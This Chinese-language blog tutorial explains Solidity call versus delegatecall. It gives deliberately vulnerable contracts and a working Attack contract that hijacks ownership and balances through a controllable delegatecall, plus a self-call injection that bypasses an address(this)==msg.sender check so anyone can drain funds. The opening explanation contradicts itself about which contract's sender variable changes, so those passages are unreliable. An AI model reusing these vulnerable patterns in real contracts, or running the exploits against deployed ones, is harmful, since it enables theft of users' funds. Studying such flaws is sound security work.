---
title: "delegatecall与call注入"
date: 2023-07-21T0:19:30-04:00
categories:
  - blog
tags:
  - experience
---

## delegatecall与call注入

### delegatecall与call的区别

delegatecall与call都是用来实现跨合约之间的互相调用的，但是它俩是有区别：
 - **调用call，内置变量 msg 的值会修改为调用者（合约地址），执行环境为被调用者的运行环境**
 - **调用delegatecall，内置变量 msg 的值不会修改为调用者（EOA地址），执行环境为调用者的运行环境**

如何理解呢？咱们来看下面的代码：
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract poc{

    address public sender;

    function calltest(address addr) external {
        addr.call(abi.encodeWithSignature("set()"));
    }

    function delegatecalltest(address addr) external {
        addr.delegatecall(abi.encodeWithSignature("set()"));
    }

}


contract test{
    address public sender;
    function set() external{
        sender = msg.sender;
    }

    function reset() external {
        sender = 0x0000000000000000000000000000000000000000;
    }
}

```

首先将poc和test合约给部署下，部署完成后poc和test合约中的状态变量sender默认是0x0000000000000000000000000000000000000000，调用poc合约中的calltest()方法后，你会发现test合约中的状态变量sender已经变为poc合约的地址了，此时test合约中的状态变量sender是0x0000000000000000000000000000000000000000。

咱们接着调用poc合约中的delegatecalltest()方法，你会发现test合约中的状态变量sender没有任何变化，而test合约中的状态变量sender已经变为msg.sender（EOA地址）了。

现在应该就能理解两者区别了吧。


### delegatecall可控

写了一个delegatecall可控场景，咱们可以控制data来修改合约所有者以及增加余额的操作。
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Token{
    mapping (address => uint256) public balance;
    address public owner;

    function delegatecalltest(address addr, bytes calldata data) external {
        addr.delegatecall(data);
    }


    function withdraw() external {
        require(owner == msg.sender,"not owner");
        payable(owner).transfer(address(this).balance);
    }

}


contract Attack{
    mapping (address => uint256) balance;
    address public owner;

    function updateowner() external {
        owner = msg.sender;
    }

    function addbalance() external {
        balance[msg.sender] +=1000;
    }

    function withdraw() external {
        require(owner == msg.sender,"not owner");
        payable(owner).transfer(address(this).balance);
    }


    function encode1() public view returns (bytes memory) {
        return abi.encodeWithSignature("updateowner()");
    }

    function encode2() public view returns (bytes memory) {
        return abi.encodeWithSignature("addbalance()");
    }   




}


```

部署Token、Attack合约，我们此时Token的owner所有者是默认值（零地址），包括balance也是默认值零，所以我们调用withdraw会失败。咱们通过调用Token合约的delegatecalltest方法来修改owner变量，addr为Attack合约，data为updateowner()函数签名。交易确认后，查看owner变量已经变成我的EOA地址了，接着我们调用withdraw方法就可以成功。当然我们也可以通过调用Token合约的delegatecalltest方法来修改owner变量，addr为Attack合约，data为addbalance()函数签名，来给自己的（EOA）地址增加余额。

总结：delegatecall可控还是比较危险的，相当于可以升级合约代码，攻击者可以添加自己的恶意代码并执行，来达到修改状态变量的目的。

### call注入
写了一个当call可控的场景，咱们可以结合call的特性，msg.sender会修改为调用者的，因此可以绕过对address(this) == msg.sender的判断，实现权限绕过提现。


```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Test{
    bool public flag;
    function withdraw(address addr) external {
        require(address(this) == msg.sender,"not address(this)");
        payable (addr).transfer(address(this).balance);
        flag = true;
    }
    function calltest(bytes memory data) external {
        address(this).call(data);
    }

    function encode() public view returns (bytes memory){
        return abi.encodeWithSignature("withdraw(address)",msg.sender);

    }
}

```

部署Test合约，首先尝试直接调用withdraw方法，交易失败，因为此时address(this) == msg.sender不满足。但因为Test合约中存在call可控的方法calltest，咱们就可以绕过这个限制，此时msg.sender是Test合约地址，传入withdraw的函数签名即可完成取款。

总结：call可控只能调用原始合约中已有的方法，需要注意的是msg.sender是调用合约的地址，transfer、burn、approve那些方法都是取msg.sender值的。

